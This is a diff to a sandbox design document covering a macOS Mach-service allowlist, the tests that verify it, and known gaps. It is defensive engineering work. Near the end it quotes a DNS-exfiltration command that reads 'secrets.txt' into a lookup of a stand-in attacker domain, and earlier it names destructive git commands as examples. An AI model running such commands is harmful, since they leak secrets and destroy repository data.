@@ -389,6 +389,45 @@ diagnostic. Granting `(subpath "/usr")` grants access to things *under* `/usr`
 but not the lookup of `/` that reaching them goes through. The failure is
 indistinguishable from a malformed profile.
 
+**Mach services are an allowlist, and it was measured rather than guessed.** A Mach
+service is a daemon outside the sandbox that acts on a client's behalf, so
+`(allow mach-lookup)` is a way out that has nothing to do with files or sockets:
+LaunchServices opens URLs and applications, `SecurityServer` fronts the keychain,
+`pasteboard.1` is the clipboard, `nsurlsessiond` fetches URLs. All four were
+reachable from the old profile. Denying LaunchServices alone had broken `git`,
+`python3`, `perl` and `curl`, so the answer had to be "what do tools need", found
+this way: run 46 common tools under an empty allowlist, read the sandbox's own
+denial log for what each failing tool was refused, add it, repeat until every tool
+behaves as it did under the blanket allow, then drop each entry in turn and keep
+only those whose removal breaks something.
+
+| grant | services | why |
+|---|---|---|
+| always | `opendirectoryd.libinfo` | `getpwuid`/`getgrgid`: `id -un`, `ls -l`'s owner column, `stat -f %Su`, Python's `pwd` and `getpass` |
+| with network | `TrustEvaluationAgent` | certificate-chain evaluation: without it an HTTPS handshake completes and then fails verification |
+
+That is the whole list (`MACH_SERVICES_BASE` and `MACH_SERVICES_NETWORK` in
+`macos.rs`). Two things about it are worth knowing before it surprises someone.
+
+*An empty list is not a strict profile.* In SBPL an `(allow mach-lookup` with no
+filter is the blanket allow: measured, `SecurityServer` is reachable through it. A
+generator that writes the block unconditionally turns an empty allowlist into the
+thing it replaced, so `mach_rule` emits nothing for an empty list, and a test pins
+that. It was found because a mutation that emptied the list passed the real-tool
+test.
+
+*The list is per macOS release.* Apple moves which daemon answers which question,
+and the battery ran on one version. A tool that works unsandboxed and fails here
+has almost certainly been refused a service, and the kernel says which:
+
+```sh
+log show --last 5m --predicate 'eventMessage CONTAINS "deny(1) mach-lookup"'
+```
+
+Whether to grant what it names is a decision about what a sandboxed command may make
+the system do for it, not a compatibility patch. A test fails if any of the four
+above is ever added.
+
 ### 6.2 Linux: Landlock for paths, seccomp for capabilities
 
 Neither alone is sufficient, and the reason is worth being precise about.
@@ -703,15 +742,19 @@ matters most for exfiltration, and gVisor (which unshares the network namespace)
 the stronger Linux option. `sandboxed_commands_without_a_network_grant_reach_no_listener`
 exists for Linux and is `#[ignore]`d with this reason.
 
-**On macOS the profile allows every `mach-lookup`.** Sockets and DNS are refused,
-but a sandboxed process can look up — measured — LaunchServices, the keychain
-server, the pasteboard and the background URL agent, each a service outside the
-sandbox that acts on a client's behalf. Whether any can be made to leak was not
-tested: that means opening URLs and reading a clipboard and keychain on the
-developer's machine. Denying LaunchServices alone breaks `git`, `python3`, `perl`
-and `curl`, so the fix is an allowlist of what tools actually need, which is its own
-piece of work. `privileged_system_services_are_not_reachable_from_the_sandbox`
-states the desired property and is `#[ignore]`d because it fails today.
+**macOS Mach services are an allowlist now (§ 6.1), with three caveats.** The four
+services that act on the user's behalf — LaunchServices, `SecurityServer`, the
+pasteboard, `nsurlsessiond` — are refused, in the offline profile *and* in the
+network-granted one, and tests ask the kernel (`bootstrap_look_up`) rather than
+reading the SBPL. The caveats: the list is what 46 common tools needed on one macOS
+release, so an unlisted tool or another release can fail with a refusal that says
+nothing about sandboxing (the `log show` command in § 6.1 names it); a network-granted
+command will not discover a proxy set in System Settings, because
+`SystemConfiguration.configd` is not granted (the tools tried ran without it, and it
+exposes interface, DNS and Wi-Fi details — `HTTPS_PROXY` still works); and "not
+reachable" is the property claimed, not "not exploitable", which was never tested
+because doing so means opening URLs and reading a clipboard and keychain on a real
+machine.
 
 **"Read-only" git rules that mutate.** `safe.vcs-inspection` allows `git branch`
 and `git tag` whatever their arguments, so `git branch -D main` and `git tag -d v1`
@@ -784,6 +827,8 @@ tests that found them.
 | a "did not run" assertion searched stdout for text the refusal message itself prints | the test failing on the wrong thing |
 | a multi-workspace test assumed two engine handles when handles are created lazily | the test failing |
 | a test built a C string containing NUL, which a C string cannot | the test failing to construct its input |
+| an SBPL `(allow mach-lookup` block with an empty filter list is the blanket allow, so an allowlist that came out empty would have silently become the rule it replaced | a mutation that emptied the list passed the real-tool test; asking the kernel showed `SecurityServer` reachable |
+| a helper that found the end of the `mach-lookup` block stopped at the first entry, so the "exactly these services" test passed vacuously for the one-entry profile | the same test failing for the two-entry (network) profile |
 
 The `git stash create` correction in § 7 belongs here too: the first draft of
 this document asserted it mutates the working tree. Measuring it showed
@@ -977,17 +1022,28 @@ one, moving it is progress — and the test fails until someone does it on purpo
 
 **What was verified on macOS, with controls:** with no network grant, TCP,
 UDP and Unix-socket connections are refused, and hostnames do not resolve through
-`getaddrinfo`, `dscacheutil` or `dns-sd`. The last is worth a sentence: the profile
-allows every `mach-lookup`, and the resolver is reachable at the Mach level, yet
-`dns-sd` reports `Service Not Running` — consistent with `libsystem_dnssd` talking
-to `mDNSResponder` over a Unix socket, which is refused with the rest. That is an
+`getaddrinfo`, `dscacheutil` or `dns-sd`. The last is worth a sentence: while the
+profile allowed every `mach-lookup` the resolver was reachable at the Mach level, yet
+`dns-sd` reported `Service Not Running` — consistent with `libsystem_dnssd` talking
+to `mDNSResponder` over a Unix socket, which is refused with the rest. That was an
 inference; the measurement is that lookups fail, in 0.01 s against 0.05 s for a
-genuine NXDOMAIN from an unsandboxed process. With the sandbox deliberately opened,
+genuine NXDOMAIN from an unsandboxed process. Mach lookups are now refused as well
+(§ 6.1) and the DNS test still passes; I did not separate which of the two layers
+now produces the failure. With the sandbox deliberately opened,
 the harness catches it: 6 sandboxed commands reached the listeners and a hostname
 resolved.
 
-**What was not:** everything in § 12's Linux and `mach-lookup` paragraphs. The
-list of channels tried is not a proof there are no others.
+**Mach services** (`privileged_system_services_are_not_reachable_from_the_sandbox`,
+`a_network_grant_does_not_open_the_services_that_act_on_the_users_behalf`): a probe
+inside the sandbox asks the bootstrap server for eight services and the test asserts
+the reachable set *equals* the granted set — `libinfo` alone offline, plus
+`TrustEvaluationAgent` with a network grant — and that none of the four is in it. The
+probe launches, opens and reads nothing. A third test, `--ignored` because it needs
+the internet, completes a real HTTPS request under the network grant; with
+`TrustEvaluationAgent` removed it fails, which is what justifies the entry.
+
+**What was not:** everything in § 12's Linux paragraph. The list of channels tried is
+not a proof there are no others.
 
 **The default was not applied per command.** Writing the `sandbox` class meant
 asking the gate about `nslookup $(cat secrets.txt).evil.example.com`, and it said
